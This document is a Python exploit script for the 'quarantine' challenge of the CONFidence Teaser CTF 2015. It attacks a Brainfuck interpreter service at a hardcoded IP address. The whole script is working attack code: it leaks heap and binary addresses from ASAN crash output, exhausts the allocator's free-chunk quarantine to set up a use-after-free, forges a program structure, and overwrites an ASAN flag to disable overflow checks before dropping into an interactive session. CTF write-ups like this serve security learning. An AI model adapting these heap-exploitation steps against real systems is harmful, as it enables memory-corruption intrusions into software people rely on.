#!/usr/bin/env python
#coding: UTF-8
#
# Exploit for 'quarantine', CONFidence Teaser CTF 2015
#
# Copyright (c) 2015 Samuel Groß
#

import struct
import time
import re
import socket
import telnetlib

TARGET = ('134.213.135.43', 10000)

def e(s):
    return s.encode('UTF-8')

def d(s):
    return s.decode('UTF-8')

def p(d, fmt='<Q'):
    return struct.pack(fmt, d)

def u(d, fmt='<Q'):
    return struct.unpack(fmt, d)

def u1(d, fmt='<Q'):
    return u(d, fmt)[0]

def readtil(delim):
    buf = b''
    while not e(delim) in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    if isinstance(b, bytes):
        s.sendall(b + b'\n')
    else:
        s.sendall(e(b) + b'\n')

def sendnum(n):
    sendln(str(n))

def add(name, code, alen=1000, clen=None):
    if not clen:
        clen = len(code) + 1
    sendln('add')
    sendln(name)
    sendnum(clen)
    sendln(code)
    sendnum(alen)

def remove(idx):
    sendln('remove')
    sendnum(idx)

def change(idx, code):
    sendln('change')
    sendnum(idx)
    sendln(code)

def select(idx):
    sendln('select')
    sendnum(idx)

def run():
    sendln('run')

def exit():
    sendln('exit')

def give_me_the_flag():
    sendln('give_me_the_flag')

# Write string/code with nullbytes in it
def write(idx, data):
    ws = []

    for i, b in enumerate(data):
        if b == b'\x00':
            ws.append(i)
            data[i] = 'A'

    ws.reverse()
    change(idx, data)
    readtil('Option: ')

    for i in ws:
        change(idx, data[:i])
        readtil('Option: ')

def leak():
    global s
    s = socket.create_connection(TARGET)
    readtil('Option: ')

    add('foo', 'a', 56, 56)
    add('aaaaaaaaaaaaaaaaaaaa', 'x')        # Want to leak the address of the second chunk, see exploit code below
    resp = d(readtil('SUMMARY'))

    m = re.search('heap-buffer-overflow on address 0x([0-9a-f]+) ', resp)
    heap = int(m.group(1), 16) - 56         # sizeof(struct program) == 56

    m = re.search('#0 0x([0-9a-f]+) ', resp)
    binary = int(m.group(1), 16) - 0x458f5

    s.close()
    return heap, binary

# "Hello World" in Brainfuck
hello_world = '++++++++[>++++[>++>+++>+++>+<<<<-]>+>+>->>+[<]<-]>>.>---.+++++++..+++.>>.<-.<.+++.------.--------.>>+.>++.'

def pwn():
    heap, binary = leak()

    global s
    s = socket.create_connection(TARGET)
    readtil('Option: ')

    # Prepare UAF condition
    add('foo', 'a', 56, 56)         # placeholder chunk, will be located _behind_ the target chunk for some reason
    add('foo', hello_world)         # target chunk
    select(1)
    add('foo', hello_world)
    remove(2)           # free currently used block -> UAF
    remove(1)

    # Fill up free chunk quarantine so first chunk can be reused
    for i in range(70):
        add('A', 'A', 0x400000)
        remove(1)

    # Address of the code we write next
    # To get this address, just enable the add('foo', ...) below instead of the other one and see where it crashes
    new_code = 0x619000002380

    # Exploit the UAF:
    # Point the brainfuck program's array to itself so we can increase its size, then overwrite
    # some adjacent structure, then change the size back to prevent vm::reset from clearing
    # the array upon return.
    # Allocate new program, its code will be allocated on top of the free'd program
    add('pwn', 55*'A', 10, 56)
    # Write fake program structure
    write(1, p(heap + 9) + p(4) + p(new_code) + p(0x400))

    payload = '->>>>>>>'                            # increase the size to 0xff04
    payload += 0x120 * '>' + ',,>,>,>,>,>,>,>,>'    # move ptr into the following chunk and change its code pointer
    payload += 0x12f * '<' + '+'                    # change the size to 0x04 again
    add('foo', payload, 100, 0x400)
    #add('foo', 0x500 * 'A', 100, 0x400)

    # Read output
    for i in range(6+70*2+2):
        readtil('Option: ')

    # Run the new program, will wait for our input
    run()

    # Main goal: disable parts of the runtime checks performed by ASAN.
    # To do this, set the code pointer of the following chunk to point to the ASAN flag ..
    asan_flag = binary + 0x5034dc
    s.sendall(p(asan_flag))
    readtil('Option: ')
    # .. then change the code of that program, overwriting the flag
    change(3, p(0x1))
    readtil('Done.')

    # Done, can use the give_me_the_flag command now as ASAN will not detect the buffer overflow (command buffer is only 8 bytes)
    print("*** GodMode activated, now type 'give_me_the_flag' ***")
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

pwn()
